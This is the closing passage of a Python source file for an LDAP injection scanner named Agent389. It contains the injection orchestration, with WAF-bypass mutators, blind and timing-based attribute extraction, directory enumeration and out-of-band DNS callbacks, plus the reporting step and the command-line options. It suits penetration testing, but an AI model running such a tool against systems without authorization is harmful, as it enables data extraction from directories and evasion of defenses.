        info(f"  Baselines collected: {len(baselines)}/{len(eps)}")

        # Donate unused discovery budget
        self._budget.donate_unused("discovery")
        self._budget.donate_unused("tier0")

        # Track scan counts
        unauth_count = sum(1 for ep in eps if ep.auth_state == AuthState.UNAUTH and ep.key in baselines)
        auth_count   = sum(1 for ep in eps if ep.auth_state == AuthState.AUTH and ep.key in baselines)
        self._handoff.unauth_endpoints_tested = unauth_count
        self._handoff.auth_endpoints_tested   = auth_count
        
        success(f"Baselines: {len(baselines)} collected (unauth={unauth_count}, auth={auth_count})")

        # V12: Store baselines snapshot for exploit validator in _finalize
        self._last_baselines = baselines

        return baselines, auth_tested

    def _phase456_injection(
        self,
        eps:       List[Endpoint],
        baselines: Dict[str, Baseline],
        prev_keys: Optional[List[str]] = None,
    ) -> List[HandoffFinding]:
        """V8 — Injection + Detection + Verification pipeline with ChainedPayloadMutator."""
        
        scanned_keys = prev_keys or []
        cp_lock = threading.Lock()
        
        # OOB listener
        oob: Optional[OOBListener] = None
        if self._cfg.collab:
            oob = OOBListener(self._cfg.collab, self._cfg.scan_id, self._cfg.oob_port)
            oob.start()
            info(f"OOB Listener active on {self._cfg.collab}:{self._cfg.oob_port}")

        # Build shared components
        pipeline  = DetectionPipeline(self._cfg)
        verifier  = ThreeStepVerifier(self._client, pipeline, self._cfg, self._budget)
        fp_filter = FalsePositiveFilter(self._client, pipeline, self._cfg)
        extractor = BlindAttributeExtractor(self._client, pipeline, self._budget, self._cfg)

        # V6: engine components
        state_tracker = ExploitStateTracker(self._cfg)
        poly_gen      = PolymorphicPayloadGenerator()
        poly_gen_ema  = PolymorphicBypassGenerator(self._client, self._cfg)
        schema_probe  = DirectorySchemaProbe(self._client, pipeline, self._budget, self._cfg)
        enum_engine   = LDAPEnumerationEngine(self._client, pipeline, self._budget, self._cfg)

        # V8: ChainedPayloadMutator seeded from control plane
        survived = getattr(self._client, "_survived_chars", None)
        chained_mutator = ChainedPayloadMutator(
            memory         = self._cp.memory,
            survived_chars = survived,
            depth          = self._cfg.poly_depth,
        )

        # TargetAwarePayloadAdaptor: seeded from Phase 0 schema intel
        schema_intel = getattr(self, "_schema_intel", [])
        rootdse_data = getattr(self, "_rootdse_data", {})
        base_dn = ""
        if isinstance(rootdse_data, dict):
            nctx = rootdse_data.get("defaultNamingContext", [""])
            base_dn = str(nctx[0]) if nctx else ""
        # Scrape group hints from landing page
        _group_hints: List[str] = []
        try:
            _lp = self._client.get(self._cfg.target, phase="discovery")
            if _lp:
                _group_hints = TargetAwarePayloadAdaptor.extract_group_hints(_lp.text or "")
        except Exception:
            pass
        ctx_adaptor = TargetAwarePayloadAdaptor(
            schema_attrs = schema_intel,
            server_type  = self._server_type,
            base_dn      = base_dn,
            group_hints  = _group_hints,
        )

        engine = InjectionEngine(
            cfg           = self._cfg,
            client        = self._client,
            budget        = self._budget,
            memory        = self._memory,
            pipeline      = pipeline,
            verifier      = verifier,
            fp_filter     = fp_filter,
            oob           = oob,
            baselines     = baselines,
            logger        = self._logger,
            state_tracker = state_tracker,
            poly_gen      = poly_gen,
            poly_gen_ema  = poly_gen_ema,
            schema_probe  = schema_probe,
            enum_engine   = enum_engine,
            ctx_adaptor   = ctx_adaptor,
            # V8
            chained_mutator = chained_mutator,
            cp_memory       = self._cp.memory,
        )

        all_findings:    List[HandoffFinding]     = []
        all_inconclusives: List[InconclusiveFinding] = []
        all_lock         = threading.Lock()
        scanned_count    = 0
        
        # Wave 4: Track schema to drive extraction
        schema_attrs = self._handoff.ldap_server_type == "ad" # stub
        # Actually use schema from intel if Phase 3 ran
        schema_attrs = getattr(self, "_schema_intel", [])

        def _scan_one(ep: Endpoint) -> None:
            nonlocal scanned_count
            self._status.endpoint = ep.url
            try:
                # L6.1 FIX: Authenticated Session Re-validation (Fix 12)
                if ep.auth_state == AuthState.AUTH and self._client.auth_available:
                    # Quick probe to check if still authenticated
                    ping_resp = self._client.send_endpoint(ep, {p: safe_val(p) for p in ep.params}, phase="verification")
                    if ping_resp and classify_response(ping_resp, baselines[ep.key]) != ResponseClass.AUTH_SUCCESS.value:
                        warn(f"  Auth session expired for {ep.url} — re-authenticating...")
                        self._client.authenticate()

                found, inclusives = engine.scan_endpoint(
                    ep,
                    server_type = self._server_type,
                    framework   = self._framework,
                )
                
                # V6: Trigger Blind Extraction for CONFIRMED findings
                for f in found:
                    if f.verification_grade == VerificationGrade.CONFIRMED.value and (
                            self._cfg.extract or self._cfg.timing_extract):
                        if extractor.confirm_oracle(ep, f.parameter_name, baselines[ep.key]):
                            success(f"    Oracle confirmed for {f.parameter_name} — starting extraction...")
                            vals = extractor.extract_all(ep, f.parameter_name, baselines[ep.key], schema_attrs)
                            if vals:
                                f.affected_ldap_attributes = list(vals.keys())
                                f.exploiter_context["extracted_values"] = vals
                                f.schema_enumerated = True
                                for attr, val in vals.items():
                                    state_tracker.record_extracted_value(attr, val)

                with all_lock:
                    all_findings.extend(found)
                    all_inconclusives.extend(inclusives)
                    scanned_count += 1
                    self._status.requests = self._client.total_requests
                    q_findings = [f for f in all_findings if f.verification_grade in ("CONFIRMED", "PROBABLE")]
                    self._status.findings = len(q_findings)
                
                with cp_lock:
                    scanned_keys.append(ep.key)
                    self._save_checkpoint(scanned_keys)

                for f in found:
                    self._logger.log_finding(f)
                    if f.verification_grade in ("CONFIRMED", "PROBABLE"):
                        print_finding_card(f)
                    elif _VERBOSE:
                        info(f"    Candidate signal saved: {f.payload_technique}")
            except Exception as exc:
                self._logger.log_error(f"scan:{ep.key}", str(exc))
                if _VERBOSE: verbose(f"Scan error {ep.key}: {exc}")

        # Run injection concurrently
        with ThreadPoolExecutor(
            max_workers = self._cfg.threads,
            thread_name_prefix = "inject"
        ) as pool:
            futs = [pool.submit(_scan_one, ep) for ep in eps]
            for fut in as_completed(futs):
                # Status Board updates automatically via thread
                try:
                    fut.result()
                except Exception as exc:
                    if _VERBOSE:
                        err(f"Thread failed: {exc}")
                        verbose(traceback.format_exc())

        self._handoff.endpoints_scanned = scanned_count
        self._handoff.signals_fired     = engine._sig_count
        self._handoff.fp_filtered       = engine._fp_count
        
        self._handoff.inconclusive_findings = [asdict(inc) for inc in all_inconclusives]

        # V6: Probe deferred second-order injections after all endpoints scanned
        deferred = state_tracker.probe_deferred_triggers(
            self._client, pipeline, baselines,
            delay=self._cfg.second_order_delay)
        if deferred:
            info(f"  [State] {len(deferred)} deferred second-order injection(s) triggered")

        if oob and oob.triggered():
            for cb in oob.callbacks:
                success(f"OOB CALLBACK DETECTED: {cb['src_ip']} searching for {cb['qname']!r}")
            oob.stop()

        return all_findings


    def _finalize(
        self, web_findings: List[HandoffFinding]
    ) -> str:
        """V8 — Comprehensive finalize: CP summary, impact, correlations, retest."""
        self._cfg.output_dir = os.path.realpath(self._cfg.output_dir)
        
        # Deduplicate before categorization
        web_findings = FindingDeduplicator.dedup(web_findings)

        # V8: Enrich each finding with impact+retest from ImpactMapper
        for f in web_findings:
            impact = ImpactMapper.map_technique(
                f.payload_technique, f.severity,
                f.exploiter_context.get("extracted_values"))
            f.impact_scenario = impact.get("scenario", "")
            f.impact_type     = impact.get("impact_type", "")
            f.blast_radius    = impact.get("blast_radius", "")
            f.attack_chain    = impact.get("attack_chain", [])
            f.retest_steps    = ImpactMapper.retest_steps(f)
            # Function class from behavioral memory
            sig_params = self._cp.memory.get_signaling_params(f.endpoint_url)
            if f.parameter_name in sig_params:
                f.behavioral_signals.append("behavioral_probe_confirmed")

        # V8: Write control plane summary
        self._handoff.control_plane_summary = {
            "total_rate_limits":     self._cp.memory.total_rate_limits,
            "adaptive_delay_peak_s": self._cp.memory.adaptive_delay,
            "top_effective_encodings": self._cp.memory.top_encodings(5),
            "best_payloads_seen":     self._cp.memory.best_payloads(3),
            "framework_detected":     self._cp.memory.framework,
            "waf_adapted":            self._cp.memory.waf_name is not None,
        }
        self._handoff.adaptive_delay_applied = self._cp.memory.adaptive_delay
        self._handoff.openapi_specs_found    = self._openapi_specs
        self._handoff.graphql_endpoints_found= self._graphql_urls

        # Categorize findings
        self._handoff.confirmed_findings = [asdict(f) for f in web_findings if f.verification_grade == VerificationGrade.CONFIRMED.value]
        self._handoff.probable_findings  = [asdict(f) for f in web_findings if f.verification_grade == VerificationGrade.PROBABLE.value]
        self._handoff.candidate_findings = [asdict(f) for f in web_findings if f.verification_grade == VerificationGrade.CANDIDATE.value]
        self._handoff.raw_ldap_findings  = [asdict(rf) for rf in self._raw_findings]
        
        # Calculate CVSS impact sum
        self._handoff.total_cvss_score = sum(
            f.cvss_score for f in web_findings
            if f.verification_grade in ("CONFIRMED", "PROBABLE"))

        # Time tracking
        self._handoff.timestamp_end    = now_iso()
        self._handoff.duration_seconds = (datetime.now(timezone.utc) - self._start).total_seconds()
        self._handoff.total_requests   = self._client.total_requests

        # Confidence Filtering
        if getattr(self._cfg, 'min_confidence', 0) > 0:
            filtered = [f for f in web_findings
                        if f.reproduction_confidence >= self._cfg.min_confidence]
            dropped  = len(web_findings) - len(filtered)
            if dropped > 0:
                info(f"  Confidence filter: dropped {dropped} findings below {self._cfg.min_confidence}%")
            web_findings = filtered

        # V12 — Exploit validation: replay CONFIRMED/PROBABLE before report
        ev = ExploitValidator(self._client, DetectionPipeline(self._cfg),
                               self._cfg, self._budget)
        baselines_snap = getattr(self, '_last_baselines', {})
        for f in web_findings:
            if f.verification_grade not in (
                    VerificationGrade.CONFIRMED.value,
                    VerificationGrade.PROBABLE.value):
                continue
            # Find matching endpoint and baseline
            ep_match = None
            for ep_key, bl in baselines_snap.items():
                if ep_key.startswith(f"{f.http_method}:{urlparse(f.endpoint_url).netloc}"):
                    ep_match = bl
                    break
            if ep_match is None:
                f.verification_steps.append("exploit_validation: no baseline available")
                continue
            # Build a minimal Endpoint for replay
            ep_stub = Endpoint(
                url    = f.endpoint_url,
                method = f.http_method,
                params = [f.parameter_name],
                source = "validation",
            )
            new_grade, new_conf, val_notes = ev.validate(f, ep_stub, ep_match)
            f.verification_grade   = new_grade
            f.reproduction_confidence = new_conf
            f.verification_steps.extend(val_notes)
            self._tracer.log("phase5", "exploit_validation",
                             f"{f.parameter_name}@{f.endpoint_url[:50]}",
                             outcome=new_grade)

        out_path = self._serializer.emit(
            handoff      = self._handoff,
            web_findings = web_findings,
            raw_findings = self._raw_findings,
            start_time   = self._start,
        )
        self._print_summary(web_findings)

        # V12 — Attach execution trace to handoff JSON
        trace = self._tracer.get()
        self._handoff.execution_trace = trace

        # V12 — Write narrative audit footer
        self._logger.write_summary_footer(self._handoff)

        # Cleanup checkpoint
        cp_path = os.path.realpath(
            os.path.join(self._cfg.output_dir, self._cfg.checkpoint_file))
        if os.path.exists(cp_path):
            try: os.remove(cp_path)
            except: pass
            
        return out_path

    def _save_checkpoint(self, keys: List[str]) -> None:
        path = os.path.join(self._cfg.output_dir, self._cfg.checkpoint_file)
        try:
            with open(path, "w") as f:
                json.dump({"scanned_keys": keys}, f)
        except Exception:
            pass

    def _load_checkpoint(self) -> List[str]:
        path = os.path.join(self._cfg.output_dir, self._cfg.checkpoint_file)
        if not os.path.exists(path):
            return []
        try:
            with open(path, "r") as f:
                data = json.load(f)
                return data.get("scanned_keys", [])
        except Exception:
            return []

    def _print_summary(
        self, findings: List[HandoffFinding]
    ) -> None:
        """CMDinj print_report() style — section header, metric rows, per-finding inline cards."""
        deduped    = FindingDeduplicator.dedup(findings)
        confirmed  = [f for f in deduped if f.verification_grade == VerificationGrade.CONFIRMED.value]
        probable   = [f for f in deduped if f.verification_grade == VerificationGrade.PROBABLE.value]
        candidates = [f for f in deduped if f.verification_grade == VerificationGrade.CANDIDATE.value]

        crits    = sum(1 for f in deduped if f.severity == "CRITICAL")
        highs    = sum(1 for f in deduped if f.severity == "HIGH")
        raw_c    = len(self._raw_findings)
        elapsed  = (datetime.now(timezone.utc) - self._start).total_seconds()
        m, s     = divmod(int(elapsed), 60)
        ts       = datetime.now().strftime("%Y-%m-%d %H:%M:%S")

        # ── Phase 5 banner ────────────────────────────────────────────────
        phase_header(5, "Final Report")
        section("SCAN SUMMARY")

        # ── Metric rows (CMDinj print_report style) ───────────────────────
        rows = [
            ("Target",               self._cfg.target),
            ("Scan ID",              self._cfg.scan_id),
            ("Completed",            ts),
            ("Duration",             f"{m}m {s:02d}s"),
            ("Total Requests",       str(self._client.total_requests)),
            ("Endpoints Discovered", str(self._handoff.endpoints_discovered)),
            ("Endpoints Scanned",    str(self._handoff.endpoints_scanned)),
            ("Budget Mode",          self._handoff.budget_mode or "auto"),
            ("WAF Detected",         ("YES — " + (self._handoff.waf_name or "unknown"))
                                      if self._handoff.waf_detected else "No"),
            ("Auth Tested",          "YES" if self._handoff.auth_tested else "No"),
            ("LDAP Server Type",     self._handoff.ldap_server_type or "unknown"),
            ("Confirmed Vulns",      str(len(confirmed))),
            ("Probable Findings",    str(len(probable))),
            ("Candidates",           str(len(candidates))),
            ("Direct LDAP Hits",     str(raw_c)),
            ("CRITICAL / HIGH",      f"{crits} / {highs}"),
        ]
        for k, v in rows:
            is_vuln = k == "Confirmed Vulns"
            is_crit = k == "CRITICAL / HIGH"
            if is_vuln:
                vc = (C.BRED + C.BOLD) if int(v) > 0 else C.BGREEN
            elif is_crit:
                vc = C.BRED if crits > 0 else (C.BYELLOW if highs > 0 else C.BGREEN)
            else:
                vc = C.BWHITE
            k_col = color(k + ":", C.BCYAN, C.BOLD)
            pad   = max(0, 24 - len(k))
            tprint(f"  {k_col}{' ' * pad} {color(v, vc)}")

        # ── No findings ───────────────────────────────────────────────────
        if not (confirmed or probable or candidates or raw_c):
            tprint(f"\n  {color('✓  No confirmed LDAP injection vulnerabilities.', C.BGREEN, C.BOLD)}")
            tprint(f"  {color('   All suspicious patterns eliminated by multi-stage verification.', C.DIM)}")
            tprint(f"  {color('   Manual review is always recommended for full confidence.', C.DIM)}")
        else:
            # ── Confirmed findings (CMDinj section + inline cards) ────────
            if confirmed:
                section(f"CONFIRMED LDAP FINDINGS  [{len(confirmed)} CONFIRMED]")
                for i, f in enumerate(confirmed, 1):
                    print_finding_card(f, idx=i)
                tprint(f"\n  {color('All confirmed findings VERIFIED — false positives filtered.', C.BWHITE)}")
                tprint(f"  {color('Fix: enforce strict LDAP input validation and parameterised queries.', C.DIM)}")

            # ── Probable findings ─────────────────────────────────────────
            if probable:
                section(f"PROBABLE FINDINGS  [{len(probable)}]")
                for i, f in enumerate(probable, 1):
                    print_finding_card(f, idx=i)

            # ── Candidates ────────────────────────────────────────────────
            if candidates and not confirmed:
                section(f"CANDIDATES  [{len(candidates)}]")
                for i, f in enumerate(candidates[:5], 1):
                    print_finding_card(f, idx=i)

            # ── Raw LDAP direct findings ──────────────────────────────────
            if raw_c:
                section(f"DIRECT LDAP PROTOCOL FINDINGS  [{raw_c}]")
                for rf in self._raw_findings:
                    tprint(f"\n  {color('★', C.BRED, C.BOLD)}  {color(rf.finding_type.upper(), C.BRED)}  "
                           f"{color(rf.host + ':' + str(rf.port), C.BWHITE)}")
                    if getattr(rf, 'evidence', ''):
                        tprint(f"  {color('  evidence:', C.DIM)} {color(str(rf.evidence)[:100], C.BGREEN)}")

            # ── Cross-endpoint chains ─────────────────────────────────────
            chains = getattr(self._handoff, '__dict__', {}).get('cross_endpoint_correlations', [])
            if chains:
                section(f"CROSS-ENDPOINT CHAINS  [{len(chains)}]")
                for ch in chains:
                    sev_c = C.BRED if ch.get('severity') == 'CRITICAL' else C.BYELLOW
                    tprint(f"  {color('◈', sev_c, C.BOLD)} {color(ch.get('description',''), sev_c)}")

        # ── Output file paths (CMDinj style) ──────────────────────────────
        tprint()
        tprint(color("  " + "─" * 68, C.DIM))
        tprint()
        tprint(f"  {color('Findings JSON  :', C.BCYAN, C.BOLD)} {color(self._cfg.findings_file, C.BGREEN + C.BOLD)}")
        tprint(f"  {color('Audit NDJSON   :', C.BCYAN, C.BOLD)} {color(self._cfg.audit_file, C.BWHITE)}")
        trace_count = len(self._tracer.get())
        tprint(f"  {color('Exec Trace     :', C.BCYAN, C.BOLD)} {color(str(trace_count) + ' steps in audit+JSON', C.DIM)}")
        tprint()
        section("SCAN COMPLETE")



# ═══════════════════════════════════════════════════════════════════════════════
# §21  CLI ARGUMENT PARSER
# ═══════════════════════════════════════════════════════════════════════════════

def _parse_args() -> argparse.Namespace:
    p = argparse.ArgumentParser(
        prog="agent389",
        description=(
            "Agent389 v12.0 — "
            "Tactical LDAP Injection Framework"
        ),
        formatter_class=argparse.RawDescriptionHelpFormatter,
    )
    p.add_argument("target", help="Target base URL")

    auth = p.add_argument_group("Authentication")
    auth.add_argument("--auth-url",  metavar="URL")
    auth.add_argument("--auth-data", metavar="k=v&k=v")
    auth.add_argument("--cookies",   metavar="name=val;...")
    auth.add_argument("--headers",   metavar="K:V,K:V")

    scan = p.add_argument_group("Scan Control")
    scan.add_argument("--endpoints", metavar="FILE",
                      help="Load external endpoints from JSON file")
    scan.add_argument("--server",
                      default="auto",
                      choices=["auto","ad","openldap",
                               "389ds","generic"],
                      help="LDAP server type hint")
    scan.add_argument("--threads",  type=int,   default=8)
    scan.add_argument("--timeout",  type=float, default=12.0)
    scan.add_argument("--depth",    type=int,   default=4)
    scan.add_argument("--rate-limit", type=float, default=4.0,
                      dest="rps", metavar="RPS")
    scan.add_argument("--proxy",    metavar="URL")
    scan.add_argument("--force-scan", action="store_true")
    scan.add_argument("--verify-ssl", action="store_true")
    scan.add_argument("--budget",   type=int, default=800,
                      metavar="N",
                      help="Max requests (auto-scaled by mode)")
    scan.add_argument("--min-confidence", type=int, default=0,
                      help="Minimum confidence threshold (0-100)")
    scan.add_argument("--behavioral-sensitivity", type=float, default=1.0,
                      help="Multiplier for behavioral scoring (default 1.0)")
    scan.add_argument("--resume", action="store_true",
                      help="Resume scan from checkpoint.json")
    scan.add_argument("--extract", action="store_true",
                      help="Enable blind LDAP attribute extraction (disclaimer: noisy)")

    v6 = p.add_argument_group("V6 Enhancements")
    v6.add_argument("--timing-extract", action="store_true",
                    help="Enable timing side-channel extraction fallback (E1)")
    v6.add_argument("--timing-samples", type=int, default=5, metavar="N",
                    help="Timing probe samples per character position (default 5)")
    v6.add_argument("--stateful", action="store_true",
                    dest="stateful_mode",
                    help="Enable stateful attack chaining + deferred second-order probing (E3)")
    v6.add_argument("--state-delay", type=float, default=2.0, metavar="SEC",
                    help="Delay between inject and deferred probe in stateful mode (default 2.0)")
    v6.add_argument("--no-poly-waf", action="store_false", dest="polymorphic_waf",
                    help="Disable polymorphic WAF bypass generation (E4, default: enabled)")
    v6.add_argument("--poly-depth", type=int, default=3, metavar="N",
                    help="Mutation chain depth for polymorphic bypass (default 3)")
    v6.add_argument("--no-schema-probe", action="store_false", dest="schema_probe_enabled",
                    help="Disable per-endpoint schema discovery (E5, default: enabled)")
    v6.add_argument("--enumerate", action="store_true", dest="enumerate_schema",
                    help="Enable post-confirm LDAP directory enumeration (E6)")

    v8 = p.add_argument_group("V8 Enhancements")
    v8.add_argument("--no-behavioral-probe", action="store_false", dest="behavioral_probe",
                    default=True,
                    help="Disable Phase 3 behavioral risk probing (V8, default: enabled)")
    v8.add_argument("--no-websocket", action="store_false", dest="ws_probe",
                    default=True,
                    help="Disable WebSocket endpoint discovery (V8, default: enabled)")
    v8.add_argument("--no-recursive-params", action="store_false", dest="recursive_params",
                    default=True,
                    help="Disable recursive parameter discovery (V8, default: enabled)")
    v8.add_argument("--no-cross-correlate", action="store_false", dest="cross_correlate",
                    default=True,
                    help="Disable cross-endpoint correlation (V8, default: enabled)")
    v8.add_argument("--mutation-depth", type=int, default=3, metavar="N",
                    dest="mutation_depth",
                    help="Chained payload mutation depth (V8, default: 3)")

    oob = p.add_argument_group("OOB Detection")
    oob.add_argument("--collab", metavar="HOST",
                     help="Collaborator host for OOB callbacks")
    oob.add_argument("--oob-port", type=int, default=53,
                     metavar="PORT")

    out = p.add_argument_group("Output")
    out.add_argument("--output-dir", default=".",
                     metavar="DIR")
    out.add_argument("--findings",
                     default="agent389_findings.json",
                     metavar="FILE",
                     help="Handoff JSON filename")
    out.add_argument("--audit",
                     default="agent389_audit.ndjson",
                     metavar="FILE",
                     help="NDJSON audit log filename")
    out.add_argument("-v", "--verbose", action="store_true")
    out.add_argument("-q", "--quiet",   action="store_true")

    return p.parse_args()


def _parse_cookies(s: Optional[str]) -> Dict[str, str]:
    if not s:
        return {}
    result: Dict[str, str] = {}
    for pair in s.split(";"):
        pair = pair.strip()
        if "=" in pair:
            k, _, v = pair.partition("=")
            result[k.strip()] = v.strip()
    return result


def _parse_headers(s: Optional[str]) -> Dict[str, str]:
    if not s:
        return {}
    result: Dict[str, str] = {}
    for pair in s.split(","):
        pair = pair.strip()
        if ":" in pair:
            k, _, v = pair.partition(":")
            result[k.strip()] = v.strip()
    return result


def _parse_auth_data(s: Optional[str]) -> Dict[str, str]:
    if not s:
        return {}
    return dict(
        p.split("=", 1) for p in s.split("&")
        if "=" in p
    )


# ═══════════════════════════════════════════════════════════════════════════════
# §22  ENTRY POINT
# ═══════════════════════════════════════════════════════════════════════════════

def main() -> int:
    global _VERBOSE, _QUIET
    args     = _parse_args()
    _VERBOSE = args.verbose
    _QUIET   = args.quiet

    if not _QUIET:
        print(f"\x1b[31m{BANNER}\x1b[0m")

    cfg = ScanConfig(
        target         = args.target.rstrip("/"),
        auth_url       = getattr(args, "auth_url", None),
        auth_data      = _parse_auth_data(
            getattr(args, "auth_data", None)),
        cookies        = _parse_cookies(
            getattr(args, "cookies", None)),
        extra_headers  = _parse_headers(
            getattr(args, "headers", None)),
        proxy          = getattr(args, "proxy", None),
        verify_ssl     = args.verify_ssl,
        timeout        = int(args.timeout),
        rps            = args.rps,
        threads        = args.threads,
        depth          = args.depth,
        request_budget = args.budget,
        server_type    = args.server,
        collab         = getattr(args, "collab", None),
        oob_port       = getattr(args, "oob_port", 53),
        force_scan     = args.force_scan,
        output_dir     = args.output_dir,
        findings_file  = args.findings,
        audit_file     = args.audit,
        verbose        = args.verbose,
        quiet          = args.quiet,
        endpoints_file = getattr(args, "endpoints", None),
        min_confidence = getattr(args, "min_confidence", 0),
        resume         = getattr(args, "resume", False),
        behavioral_sensitivity = getattr(args, "behavioral_sensitivity", 1.0),
        # V6 enhancements
        timing_extract       = getattr(args, "timing_extract",       False),
        timing_samples       = getattr(args, "timing_samples",       5),
        stateful_mode        = getattr(args, "stateful_mode",        False),
        state_delay          = getattr(args, "state_delay",          2.0),
        polymorphic_waf      = getattr(args, "polymorphic_waf",      True),
        poly_depth           = getattr(args, "poly_depth",           3),
        schema_probe_enabled = getattr(args, "schema_probe_enabled", True),
        enumerate_schema     = getattr(args, "enumerate_schema",     False),
    )

    if cfg.collab and cfg.oob_port != 53:
        warn(f"OOB port set to {cfg.oob_port}. Note: Port 53 (DNS) is the most likely to bypass firewalls.")

    try:
        orchestrator = ScanOrchestrator(cfg)
        out_path     = orchestrator.run()
        info(f"Output: {out_path}")
        return 0
    except KeyboardInterrupt:
        warn("\nScan interrupted")
        return 130
    except Exception as exc:
        err(f"Fatal: {exc}")
        if _VERBOSE:
            traceback.print_exc()
        return 2


if __name__ == "__main__":
    sys.exit(main())